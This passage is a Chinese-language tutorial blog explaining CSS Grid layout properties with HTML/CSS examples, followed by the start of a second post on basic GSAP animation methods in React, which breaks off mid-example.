Codepen：點這裡 這裡想問的是，同樣都是填滿，也同樣都放入兩個元素，你能解釋出為什麼會這樣的差異嗎？ 你可以先自己思考看看，再來看下面的解釋。 如果不太清楚的話，參考這張圖： 所以最後留給各位一個問題，看看各位是否真的有理解這兩者的差異。 假設現在的需求是希望不管放入多少元素，元素都要把整個grid空間填滿，請問該用auto-fit還是auto-fill呢？ display用途：建立 grid 網格 我知道介紹這個屬性好像有點多餘，不過你知道其實它有兩個值可以設定嗎？ 12345678910&lt;div class=\"container\"&gt; &lt;!-- grid-box(1) --&gt; &lt;div class=\"box\"&gt; &lt;div class=\"box__item box__item--yellow\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;!-- grid-box(2) --&gt; &lt;div class=\"box\"&gt; &lt;div class=\"box__item box__item--yellow\"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 123456.box { // 建立grid空間，並將grid空間自身設為inline元素 display: inline-grid; // 建立grid空間，並將grid空間自身設為block元素 display: grid;} 🚀 Codepen：點這裡 grid-template-rows &amp; grid-template-columns用途：設定顯性格線(列)的寬度 &amp; 設定顯性格線(欄)的寬度 讓我們來建立一個 4 欄 2 列的 grid 網格。 建立基本的 HTML： 123456789101112&lt;div class=\"box\"&gt; &lt;!-- 第一列 --&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt; &lt;!-- 第二列 --&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt;&lt;/div&gt; 建立 grid 網格以及設定： 1234567.box { // 設定欄（4個欄，各100px） grid-template-columns: 100px 100px 100px 100px; // 設定列（2個列，各100px） grid-template-rows: 100px 100px;} 🚀 Codepen：點這裡 如果覺得上面這樣寫有點麻煩的話，你也可以搭配repeat()來使用： 12345678910111213141516.box { // 第一種 grid-template-columns: repeat(4, 100px); // 等於以下 grid-template-columns: 100px 100px 100px 100px; // 第二種 grid-template-columns: repeat(2, 100px) 200px; // 等於以下 grid-template-columns: 100px 100px 200px; // 第三種 grid-template-columns: repeat(2, 100px) 20%; // 等於以下 grid-template-columns: 100px 100px 20%;} 自訂義格線名稱使用grid-template-columns / rows的時候，是可以自定義格線的名字的。💡 只有 grid-template 可以，grid-auto 不行。 123456789101112131415.box { display: grid; // 欄 grid-template-columns: [Cline-start]100px [Cline-2]100px [Cline-3]100px [Cline-4]100px [Cline-end]; // 列 grid-template-rows: [Rline-start]100px [Rline-2]100px [Rline-end];} 畫成圖的話會長的像這樣： 接著 grid 元素就能拿我們取的名字來設定。 123.yellow { grid-row-start: Rline-2;} 🚀 Codepen：點這裡 自定義格線名稱時的注意事項🎉 註：這個問題是一位臉書中的社友幫助我解開的，非常謝謝你幫助我解惑。 這邊要特別注意一件事，當你想幫格線取名稱時，請盡量避免在名稱中使用-start與-end這兩個關鍵字。 讓我們直接用例子來做解說： 123456&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt;&lt;/div&gt; 123456789101112131415.box { display: grid; // 欄 grid-template-columns: [Cline1-start]100px [Cline2-start]100px [Cline3-start]100px [Cline4-start]100px [Cline5-start]; // 列 grid-template-rows: [Rline1-end]100px [Rline2-end]100px [Rline3-end];} 假設在沒做任何設定時的網格與元素長這樣： 現在我們對黃色方塊做以下設定： 1234.item--yellow { // ↓ 將起始點設在Cline3這條格線上 grid-column-start: Cline3;} 🚀 Codepen：點這裡 你能看到黃色方塊居然自動移動到了Cline3-start這條格線上的位置。 我個人把這個機制看作是一種備用機制，這個備用機制會在當你指定一條不存在的格線名稱時觸發。 在我們剛剛使用指定Cline3的時候，grid-column-start會試著去找名字叫做Cline3的這條格線，但它發現並沒有叫做Cline3的格線，所以它會自動幫你在Cline3的後面加上-start這個關鍵字。 所以當加入這個關鍵字後，grid-column-start會再次尋找是否有Cline3-start這條格線，而這時就能正確找到我們在一開始取名為Cline3-start的那條格線。 而這也就是為什麼我們明明沒有指定正確的名稱也能夠找到格線的位置。 所以即便你現在把格線名稱取成這樣： 12345678910111213141516.box { display: grid; // 欄 grid-template-columns: [Cline1-start]100px [Cline2-start]100px // ↓ 把名稱改成這樣 [Cline3-start-start]100px [Cline4-start]100px [Cline5-start]; // 列 grid-template-rows: [Rline1-end]100px [Rline2-end]100px [Rline3-end];} 1234.item--yellow { // ↓ 將起始點設在Cline3-start這條格線上 grid-column-start: Cline3-start;} 最後的結果也是會跟剛剛是一樣的。（找不到 Cline3-start → 改找 Cline3-start-start） 🚀 Codepen：點這裡 但如果你現在又改成這樣： 12345678910111213141516.box { display: grid; // 欄 grid-template-columns: [Cline1-start]100px [Cline2-start]100px // ↓ 不使用-start關鍵字 [Cline3-abcde]100px [Cline4-start]100px [Cline5-start]; // 列 grid-template-rows: [Rline1-end]100px [Rline2-end]100px [Rline3-end];} 123.item--yellow { grid-column-start: Cline3;} 🚀 Codepen：點這裡 此時黃色方塊就消失了，為什麼？ 套用剛剛的機制，當Cline3找不到時，它會改找Cline3-start這條格線，但由於我們取的名稱為Cline3-abcde，所以即便它採取了這個備用機制，它也無法找到正確的位置，因此黃色方塊才會消失。 至於-end又會發生在什麼情況呢？ 其實跟剛剛都是一樣的道理，只不過-end是在使用grid-column-end來做設定的時候發生。 所以下次再幫格線命名的時候，建議最好避免使用-start，-end這兩個關鍵字。 一個格線可以有一個以上的格線名稱1234567891011121314.box { display: grid; grid-template-columns: [Cline-start]100px // 以空格分開，這兩個名稱都能代表這條格線。 [Cline1-end Cline2-start]100px [Cline-3]100px [Cline-4]100px [Cline-end]; grid-template-rows: [Rline-start]100px [Rline-2]100px [Rline-end];} 這裡利用格線名稱來設定黃色方塊的位置。 12345.item--yellow { // 將起始點設為Cline1-end的位置 //（第二條欄格線） grid-column-start: Cline1-end;} 🚀 Codepen：點這裡 當有相同的格線名稱時當有相同的格線名稱時，可以寫成格線名稱 + 指定數字來指定格線： 1234.box { // 都取名為 line grid-template-columns: [line]100px [line]100px [line]100px [line]100px [line]100px [line];} 12345.yellow { // 1 = 相同名稱中的第一個。 // 2 = 相同名稱中的第二個。 grid-column-start: line 2;} 🚀 Codepen：點這裡 grid-row &amp; grid-column用途：利用格線來設定 grid 元素 的位置與範圍 grid-row &amp; grid-column 都是縮寫的形式，請參照以下： 1234567891011.item { grid-row: 1 / 2; // 等於以下 grid-row-start: 1; grid-row-end: 2; grid-column: 2 / 5; // 等於以下 grid-column-start: 2; grid-column-end: 5;} 此屬性前面已經介紹過，可以參考前面的範例。 grid-auto-flow用途：設定grid元素的排列方式 💡 註：預設值為row 運作流程我看到大部分的教學是以隱性格線的設定(grid-auto) 來做舉例，但這個屬性並不是只能用在隱性格線，其實在顯性格線上(grid-template)也是可行的。 如果只用一列一列排序跟一欄一欄排序這個詞來記的話，在顯性或隱性之間會很混淆（我自己是這樣），因此我分析了一下它的實際運作方式，發現原來是我少了一些步驟，才會常常搞混。 簡單來說，可以拆成以下動作： 觀察目前的網格中的總欄數與總列數 當網格中的欄或列還沒被填滿時，grid 元素會先根據 grid-auto-flow 的值來決定要填滿欄還是列。 如果是column(欄) → 填滿欄，如果是row(列) → 填滿列。 當網格中的欄或列被填滿時，grid 元素才會跳到下一欄或下一列。 💡 註：所以你可以發現，跳到下一欄或下一列其實是最後一步才做的動作。 記憶小口訣 grid-auto-flow: row → 先把列填滿，再跳下一列。 grid-auto-flow: column → 先把欄填滿，再跳下一欄。 設定顯性格線的情況直接來看例子： 1234567&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt; &lt;div class=\"item--purple\"&gt;&lt;/div&gt;&lt;/div&gt; 12345678910.box { // 建立 grid 網格 display: grid; // 四欄 (顯性格線) grid-template-columns: repeat(4, 100px); // 兩列 (顯性格線) grid-template-rows: repeat(2, 100px); // 預設值 grid-auto-flow: row;} 你可以看到，grid 元素會先把第一個列給填滿，接著在放到第二個列。 🚀 Codepen：點這裡 接著做一點調整： 123.box { grid-auto-flow: column;} 現在 grid 元素會先把第一個欄給填滿，接著在放到第二個欄，以此類推。 🚀 Codepen：點這裡 設定隱性格線的情況直接來看例子： 1234567&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt; &lt;div class=\"item--purple\"&gt;&lt;/div&gt;&lt;/div&gt; 12345678910.box { // 建立 grid 網格 display: grid; // 設定隱性格線 grid-auto-columns: 100px; // 設定隱性格線 grid-auto-rows: 100px; // 預設值 grid-auto-flow: row;} 由於這裡沒有設定顯性格線，所以你能看到 grid 元素會直接往下一個列來擺放。 💡 註：因為沒有設定顯性格線，所以代表目前的總欄數 / 總列數的數量皆為1。 🚀 Codepen：點這裡 再做一點調整： 123.box { grid-auto-flow: column;} 跟剛剛一樣，grid 元素會直接往下一個欄來擺放。 🚀 Codepen：點這裡 解決跳格的問題grid-auto-flow 其實還有一個屬性值是dense，主要是用來解決grid元素自動跳格的問題。 這裡直接看例子會比較清楚： 🚀 Codepen：點這裡 簡單解釋一下圖中的設定： 設定 10 欄的網格空間，列數不限制（不設定）。 藍色方塊會佔據 6 欄 2 列 粉色方塊會佔據 2 欄 綠色方塊會從最尾端的位置向前佔據 5 欄 編號為 9 倍數的方塊會佔據 2 欄 你能看到，一排最多只有 10 欄，所以編號6的藍色方塊只能放到下一排，導致後面的方塊也跟著往後排。 綠色方塊也一樣，因為欄數不夠的關係，放到下一排，並導致後面的方塊也跟著往後排。 現在讓我們在 grid 網格中加入dense的設定： 123.box { grid-auto-flow: dense;} 🚀 Codepen：點這裡 看起來整齊多了！雖然編號6的藍色方塊一樣被放到了下一排，但是現在後面的[7] [8] [9] [10] 方塊沒有跟著被放到下一排，而是被放到第一排裡去。 這是就是dense的作用，當編號6的藍色方塊放不下時，它會繼續從後面的方塊中找出能夠被填進去的方塊。 不過方塊的順序也會因為這樣而亂掉，這一點要多留意。 最後做個補充，dense是跟著row / column的設定來執行的，所以如果你希望排列方式是以column來排列，你可以這樣子寫： 123.box { grid-auto-flow: dense column;} 💡 註：由於預設的排列方式為 row，所以剛剛才可以只寫一個 dense。 🚀 Codepen：點這裡 grid-auto-rows &amp; grid-auto-columns用途：設定隱性格線(列)的寬度 &amp; 設定隱性格線(欄)的寬 再次提醒，記得要分清楚 grid-template 與 grid-auto 這兩者的差異： grid-template = 設定顯性格線 grid-auto = 設定隱性格線 當 grid 網格中的元素超過grid-template的設定範圍時，就會套用grid-auto的設定。 例如： 123456&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt;&lt;/div&gt; 123456789101112131415.box { // 設定顯性格線 // 兩欄 100px 100px grid-template-columns: 100px 100px; // 一列 100px grid-template-rows: 100px; // 設定隱性格線 // 每一列 200px grid-auto-rows: 200px; // 網格的預設排列方式是 \"列\" // 所以超過範圍的方塊才會被放到下一列 grid-auto-flow: row:} 你也可以不寫grid-template，只寫grid-auto，這樣子就可以建造出固定的寬度的欄與列。 12345&lt;div class=\"box\"&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt;&lt;/div&gt; 12345678.box { // 建立網格空間 display: grid; // 每一列皆為100px grid-auto-rows: 100px; // 每一欄皆為200px grid-auto-columns: 200px;} 這樣子不論你在 grid 網格中放了多少個元素，它都會按照grid-auto的設定下去放置。 如果你希望是 grid 元素是以垂直來排列，記得再加上這一句： 123.box { grid-auto-flow: column;} 最後，我們參照 960 grid，來做個相同概念的網格空間： 🚀 Codepen：點這裡 grid-area &amp; grid-template-areas用途：對 grid 元素取名稱 &amp; 用取好的名稱來排位置 其實這個屬性比較偏向好玩用，我個人認為實際上並不實用，可以了解一下就好。 💡 註 1：一旦對 grid 元素取了名子，就得透過 grid-template-areas 來指定位置，否則grid元素不會自動被放入grid網格中。 12345&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt;&lt;/div&gt; 123456789101112// 對 grid 元素做設定// 雖然正常情況下你不該取中文，不過這樣其實是能運作的。// (偷偷告訴你，其實 emoji 也可以當名稱...).item--yellow { grid-area: 小黃;}.item--pink { grid-area: 小粉;}.item--blue { grid-area: 小藍;} 1234.box { // 設定grid元素在網格中的位置 grid-template-areas: '小黃 小粉 小藍';} 另外，如果你不喜歡小粉，你希望小粉從這個世界上消失的話，也可以這樣子寫： 123456.box { // \".\" 代表這一格要留空 grid-template-areas: '小黃 . 小藍'; // 或任何不存在的名字也可以 grid-template-areas: '小黃 小黑 小藍';} 🚀 Codepen：點這裡 使用 grid-area 的一些小問題🎉 註：這個問題是一位臉書中的社友幫助我解開的，非常謝謝你幫助我解惑。 一旦你對一個 grid 元素取了名字，且又沒有透過grid-template-areas把這個 grid 元素給放到網格中，你就會發現格線的編號會超出預期的狀況，讓我們看以下的例子： 12345&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt;&lt;/div&gt; 我們對每一個 grid 元素取名字。 123456789.item--yellow { grid-area: 小黃;}.item--pink { grid-area: 小粉;}.item--blue { grid-area: 小藍;} 但我們只在網格中放入小黃： 123456.box { // ↓ 以下建立一個三欄一列的網格 grid-template-columns: repeat(3, 100px); grid-template-rows: 100px; grid-template-areas: '小黃 小黃 小黃';} 🚀 Codepen：點這裡 其實這之中發生了一件事情，讓我們用放非常大的倍率來重新看一次。 所以其實並不是格線的編號亂掉了，而是當你使用grid-area幫元素取名稱後，又沒有幫他放置到網格中時，這個時候就會自動產生出兩條隱性格線，所以你才會感覺到格線編號自動被加了2。 如果你有正確的把每一個被命名的 grid 元素都放入到網格中，這個問題就不會發生了。 123456.box { // ↓ 現在把小粉跟小藍都乖乖放到網格中 grid-template-columns: repeat(3, 100px); grid-template-rows: 100px; grid-template-areas: '小黃 小粉 小藍';} 🚀 Codepen：點這裡 所以…如果沒什麼特殊原因的話，不要做這種幫元素取名稱，卻又不幫他安排位置的這種事情。 （這就好像你買了電影票卻沒有被安排座位一樣。） grid-template-areas 的使用規則grid-template-areas 必須遵守下列規則，並不是想怎麼排就怎麼排： 元素必須連續，不可以斷開 1234.box { // 小黃斷掉了 grid-template-areas: '小黃 小粉 小黃';} 會重複出現的元素，組合起來一定要是一個矩形 1234567891011.box { // 這樣OK grid-template-areas: '小黃 小粉 小藍' '小黃 小粉 小藍'; // 這樣不OK（老鼠屎 = 小藍） grid-template-areas: '小黃 小粉 小藍' '小藍 小粉 小藍';} 每一列的數量都要一樣 1234567891011.box { // 這樣OK grid-template-areas: '小黃 小粉 小藍' '小黃 小粉 小藍'; // 這樣不OK grid-template-areas: '小黃 小粉' '小藍 小粉 小藍';} 所以…使用上確實不是那麼方便，但就是好玩吧！ grid-area 的其他用途grid-area除了對 grid 元素命名以外，也是設定 grid 元素位置的縮寫屬性，請參考這個格式： 12// ========= 列格線的起始點 / 欄格線的起始點 / 列格線的終點 / 欄格線的終點grid-area: grid-row-start / grid-column-start / grid-row-end / grid-column-end; 看得有點眼花？我是這樣記的 → 先設雙方的起點，在設雙方的終點。 這裡也舉個例子： 1234&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt;&lt;/div&gt; 1234567891011121314151617181920.box { display: grid; // 建立 4 個欄 grid-template-columns: repeat(4, 100px); // 建立 2 個列 grid-template-rows: repeat(2, 100px);}.item--yellow { grid-area: 1 / 1 / 3 / 2; // 等於以下 grid-row: 1 / 3; grid-column: 1 / 2;}.item-blue { grid-area: 1 / 2 / 3 / -1; // 等於以下 grid-row: 1 / 3; grid-column: 2 / -1;} 🚀 Codepen：點這裡 grid-template-areas 格線的自動命名機制在使用grid-template-areas來指定 gird 元素的位置時，每一個格線都會自動以grid-area的名稱來命名，例如： 123456.box { grid-template-areas: '小黃 小粉 小藍 小紫' '小黃 小粉 小藍 .' '小黃 小粉 小藍 .';} 小黃區塊的起始格線(欄/列)會自動被命名為 小黃-start 小黃區塊的終點格線(欄/列)會自動被命名為 小黃-end 小粉、小藍以此類推 所以如果我們要移動小紫到小黃-start(欄) 及小黃-end(欄)的位置： 123.item--purple { grid-column: 小黃-start / 小黃-end;} 🚀 Codepen：點這裡 column-gap &amp; row-gap &amp; gap用途：設定欄與列之間的距離 💡 註：grid-column-gap &amp; grid-row-gap &amp; grid-gap是某些舊版瀏覽器的非標準寫法，故這裡就不再列出。 12345678.box { // 列與列之間的間距 row-gap: 10px; // 欄與欄之間的間距 column-gap: 30px; // 縮寫形式：row-gap column-gap gap: 10px 30px;} 🚀 Codepen：點這裡 justify-items用途：控制所有grid元素在「橫向」的對齊位置 stretch 填滿整個橫向空間 (預設值)💡 註：當 grid 元素沒有設定寬度時才會生效。 123.box { justify-items: stretch;} 🚀 Codepen：點這裡 start 對齊橫向空間的起端💡 註：當 grid 元素有設定寬度時才會生效。 123.box { justify-items: start;} 🚀 Codepen：點這裡 center 對齊橫向空間的中間💡 註：當 grid 元素有設定寬度時才會生效。 123.box { justify-items: center;} 🚀 Codepen：點這裡 end 對齊橫向空間的尾端💡 註：當 grid 元素有設定寬度時才會生效。 123.box { justify-items: end;} 🚀 Codepen：點這裡 align-items用途：控制所有grid元素在「直向」的對齊位置 stretch 填滿整個直向空間 (預設值)💡 註：當 grid 元素沒有設定高度時才會生效。 123.box { align-items: stretch;} 🚀 Codepen：點這裡 start 對齊直向空間的起端💡 註：當 grid 元素有設定高度時才會生效。 123.box { align-items: start;} 🚀 Codepen：點這裡 center 對齊直向空間的中間💡 註：當 grid 元素有設定高度時才會生效。 123.box { align-items: center;} 🚀 Codepen：點這裡 end 對齊直向空間的尾端💡 註：當 grid 元素有設定高度時才會生效。 123.box { align-items: end;} 🚀 Codepen：點這裡 place-items用途：同時設定 align-items 與 justify-items 第一個值設定 align-items 第二個值設定 justify-items 💡 註 1：若只設定一個值，則該值會同時指定給兩個屬性。💡 註 2：請記得兩個屬性的規則，什麼時候 grid 元素該有寬/高度，什麼時候不該有寬/高度。💡 註 3：IE 不支援這個縮寫法。 1234.box { // 直向對齊終點 &amp; 橫向對齊中間 place-items: end center;} 🚀 Codepen：點這裡 快速水平 / 垂直置中1234.box { // 直向 &amp; 橫向對齊中間 place-items: center;} 🚀 Codepen：點這裡 justify-content用途：分配 grid 空間中「橫向」的剩餘空間 💡 註：grid 空間中必須要有剩餘的空間，這個屬性才有用。 在學這個屬性前，建議先拆成以下的結構，比較不會搞混： grid網格 grid空間 grid元素 123456789101112131415// grid空間.box { width: 960px; // grid網格 display: grid; // 四欄 grid-template-columns: repeat(4, 100px); // 兩列 grid-template-rows: repeat(2, 100px);}// grid 元素.item {...} items 與 content 的差異 justify-items / align-items 設定的是 grid 元素在 grid 網格中的位置。 justify-content / align-content 設定的是 grid 網格在 grid 空間中的位置。 start 將橫向的剩餘空間丟到最尾端💡 註：你可以想像是把多餘空間移到後面後， grid 網格就會往起點處(start)貼齊。 123.box { justify-content: start;} 🚀 Codepen：點這裡 end 將橫向的剩餘空間丟到最頭端💡 註：你可以想像是把多餘空間移到後面後， grid 網格就會往終點處(end)貼齊。 123.box { justify-content: end;} 🚀 Codepen：點這裡 center 將橫向的剩餘空間分配到左右兩側💡 註：你可以想像是把多餘空間分配到兩側後， grid 網格就會往中間處(center)貼齊。 123.box { justify-content: center;} 🚀 Codepen：點這裡 space-around 將橫向的剩餘空間平均分配到 grid 元素之間以及左右兩側💡 註 1：grid 元素之間保留相等的剩餘空間💡 註 2：左右兩側保留 grid 元素 1/2 的剩餘空間 123.box { justify-content: space-around;} 🚀 Codepen：點這裡 space-between 將橫向的剩餘空間平均分配到 grid 元素之間💡 註： 只有 grid 元素之間會分配到剩餘空間，左右兩側不會。 123.box { justify-content: space-between;} 🚀 Codepen：點這裡 space-evenly 將橫向的剩餘空間平均分配到 grid 元素之間以及左右兩側💡 註： grid 元素之間與左右兩端的剩餘空間均相等。 123.box { justify-content: space-evenly;} 🚀 Codepen：點這裡 align-content用途：分配 grid 空間中「直向」的剩餘空間 💡 註：grid 空間中必須要有剩餘的空間，這個屬性才有用。 start 將直向的剩餘空間丟到最尾端💡 註：你可以想像是把多餘空間移到後面後， grid 網格就會往起點處(start)貼齊。 123.box { align-content: start;} 🚀 Codepen：點這裡 end 將橫向的剩餘空間丟到最頭端💡 註：你可以想像是把多餘空間移到後面後， grid 網格就會往終點處(end)貼齊。 123.box { align-content: end;} 🚀 Codepen：點這裡 center 將直向的剩餘空間分配到左右兩側💡 註：你可以想像是把多餘空間分配到兩側後， grid 網格就會往中間處(center)貼齊。 123.box { align-content: center;} 🚀 Codepen：點這裡 space-around 將直向的剩餘空間平均分配到 grid 元素之間以及上下兩側💡 註 1：grid 元素之間保留相等的剩餘空間💡 註 2：上下兩側保留 grid 元素 1/2 的剩餘空間 123.box { align-content: space-around;} 🚀 Codepen：點這裡 space-between 將直向的剩餘空間平均分配到 grid 元素之間💡 註： 只有 grid 元素之間會分配到剩餘空間，上下兩側不會。 123.box { align-content: space-between;} 🚀 Codepen：點這裡 space-evenly 將橫向的剩餘空間平均分配到 grid 元素之間以及上下兩側💡 註： grid 元素之間與上下兩端的剩餘空間均相等。 123.box { align-content: space-evenly;} 🚀 Codepen：點這裡 place-content用途：同時設定 align-content 與 justify-content 第一個值設定 align-content 第二個值設定 justify-content 💡 註 1：若只設定一個值，則該值會同時指定給兩個屬性。💡 註 2：IE 不支援這個縮寫法。 12345.box { // 直向分配剩餘空間到上下兩端 // 橫向分配剩餘空間到左右兩端 place-content: center center;} 🚀 Codepen：點這裡 justify-self用途：控制單一個grid元素在「橫向」的對齊位置 stretch 填滿整個橫向空間 (預設值)💡 註：當 grid 元素沒有設定寬度時才會生效。 123.item { justify-self: stretch;} 🚀 Codepen：點這裡 start 對齊橫向空間的起端💡 註：當 grid 元素有設定寬度時才會生效。 123.item { justify-self: start;} 🚀 Codepen：點這裡 center 對齊橫向空間的中間💡 註：當 grid 元素有設定寬度時才會生效。 123.item { justify-self: center;} 🚀 Codepen：點這裡 end 對齊橫向空間的尾端💡 註：當 grid 元素有設定寬度時才會生效。 123.item { justify-self: end;} 🚀 Codepen：點這裡 align-self用途：控制單一個grid元素在「直向」的對齊位置 stretch 填滿整個直向空間 (預設值)💡 註：當 grid 元素沒有設定高度時才會生效。 123.item { align-self: stretch;} 🚀 Codepen：點這裡 start 對齊直向空間的起端💡 註：當 grid 元素有設定高度時才會生效。 123.item { align-self: start;} 🚀 Codepen：點這裡 center 對齊直向空間的中間💡 註：當 grid 元素有設定高度時才會生效。 123.item { align-self: center;} 🚀 Codepen：點這裡 end 對齊直向空間的尾端💡 註：當 grid 元素有設定高度時才會生效。 123.item { align-self: end;} 🚀 Codepen：點這裡 place-self用途：同時設定 align-self 與 justify-self 第一個值設定 align-self 第二個值設定 justify-self 💡 註 1：若只設定一個值，則該值會同時指定給兩個屬性。💡 註 2：請記得兩個屬性的規則，什麼時候 grid 元素該有寬/高度，什麼時候不該有寬/高度。💡 註 3：IE 不支援這個縮寫法。 1234.item { // 直向對齊中間 &amp; 橫向對齊中間 place-self: center center;} 🚀 Codepen：點這裡 order用途：設定grid元素的前後順序 其實就和flex中的 order 是同一個概念，每一個 grid 元素的 order 預設值皆為0。 order 值越大的 grid 元素，會被放在越前面。order 值越小的 grid 元素，會被放在越後面。 💡 註：要記得留意當下的資料流向，哪個方向代表前面？哪個方向代表後面？` 123456789101112131415&lt;!-- 原本的排序(左 → 右) --&gt;&lt;div class=\"box-normal\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt;&lt;/div&gt;&lt;!-- 反過來排序(右 → 左) --&gt;&lt;div class=\"box-reverse\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt;&lt;/div&gt; 12345678910111213// 原本的排序(左 → 右).box-normal .item--yellow { order: 0;}.box-normal .item--blue { order: 0;}.box-normal .item--green { order: 0;}.box-normal .item--pink { order: 0;} 由於每個元素的 order 值都相等，所以會依照 HTML 的順序來排列： 黃→ 藍 → 綠 → 粉 以下我們透過修改 order 值，來把順序更改成： 粉→ 綠 → 藍 → 黃 12345678910111213// 反過來排序(右 → 左).box-reverse .item--yellow { order: 3;}.box-reverse .item--blue { order: 2;}.box-reverse .item--green { order: 1;}.box-reverse .item--pink { order: 0;} 💡 在我們沒有設定 &lt;html&gt; 的 dir屬性時，預設的資料流向會是「由左 → 右」(ltr)。 🚀 Codepen：點這裡 參考資料CSS | 所以我說那個版能不能好切一點？ - Grid 基本用法GRID GARDENFractional unit (FR) overviewA Complete Guide to Grid[CSS] 關於 Grid Layout 的使用姿勢【CSS】Grid 佈局總結30 天 CSS 隨手筆記 - 第 09 天 - OMG… Grid Layout~!! ( 5/7 - item 屬性 )The Difference Between Explicit and Implicit GridsCSS GRID: Implicit vs Explicit Tracks — 5 of 25CSS Flex &amp; Grid 排版詳解（下）：Oh My Grid!GRID: A simple visual cheatsheet for CSS Grid LayoutGrid Layout 三部曲：auto-fill ? auto-fit ? 我們不一樣。","link":"/2021/07/26/grid-system/"},{"title":"Gsap－常見的基本方法","text":"懶人包。 gsap.to()設定動畫結束時的屬性。也就是說開始時的屬性會以原本 CSS 設定的屬性為主，例如： 12345678910111213141516171819202122import { useEffect } from 'react'import { gsap } from 'gsap'function App() { useEffect(() =&gt; { // 選到 .square 這個元素 gsap.to('.square', { x: 300, // translateX(300px) duration: 1 }) }, []) return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square'&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; )}export default App 如果我想自己控制動畫的播放/暫停之類的話怎麼辦？基本上 gsap 大部分的 API 都會回傳一個「Tween」，直翻的話會翻成「補間動畫」，但我自己是理解成這段動畫的 instance，覺得這樣比較好懂一點。 所以剛剛的範例可以改寫成這樣： 123456789101112131415161718192021222324252627282930313233import { useEffect } from 'react'import { gsap } from 'gsap'function App() { useEffect(() =&gt; { // 把 instance 存起來 const tween = gsap.to('.square', { x: 300, duration: 1, paused: true // 用暫停來取消自動播放 }) // 透過按鈕 + 監聽器來控制動畫的播放與倒放 document.querySelector('.play-btn')!.addEventListener('click', () =&gt; { tween.play() }) document.querySelector('.reverse-btn')!.addEventListener('click', () =&gt; { tween.reverse() }) }, []) return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square'&gt;&lt;/div&gt; &lt;/div&gt; &lt;button className='btn play-btn'&gt;Start&lt;/button&gt; &lt;button className='btn reverse-btn'&gt;Reverse&lt;/button&gt; &lt;/div&gt; )}export default App 我想要「按照順序」來播放動畫如果單用 gsap.to() 的話可以透過 delay 來設定延遲時間，不過當動畫很複雜的時候也許你會想用 timeline 來處理，這個後面會在介紹，先不用太在意。 假設我們想實現這個效果： 附註：先往右邊移動後再往下移動。 那就能這樣子設定： 1234567891011121314151617181920212223242526272829import { useEffect } from 'react'import { gsap } from 'gsap'function App() { function demo() { gsap.to('.square', { x: 300, duration: 1 }) gsap.to('.square', { y: 300, delay: 1, duration: 1 }) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square'&gt;&lt;/div&gt; &lt;/div&gt; &lt;button className='btn' onClick={demo}&gt; Start &lt;/button&gt; &lt;/div&gt; )}export default App gsap.from()跟 gsap.to 反過來的意思，這邊是決定動畫開始時的屬性，動畫結束時會回到原本在 CSS 設定的屬性。 123456789101112131415161718192021222324import { useEffect } from 'react'import { gsap } from 'gsap'function App() { function demo() { gsap.from('.square', { x: 300, duration: 1 }) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square'&gt;&lt;/div&gt; &lt;/div&gt; &lt;button className='btn' onClick={demo}&gt; Start &lt;/button&gt; &lt;/div&gt; )}export default App gsap.fromTo()當你不想要依據原本的 CSS 屬性來做動畫時，就可以直接用 gsap.fromTo() 來決定動畫開始與結束時的屬性： 附註：注意原本的位置在最前面，但按下 Start 後是動畫會從我們設定的位置開始，而不是原本 CSS 給的位置。 123456789101112131415161718192021222324252627282930import { gsap } from 'gsap'function App() { function demo() { gsap.fromTo( '.square', { x: 300, duration: 1 }, { x: 600, duration: 1 } ) } return ( &lt;div className='App'&gt; &lt;div 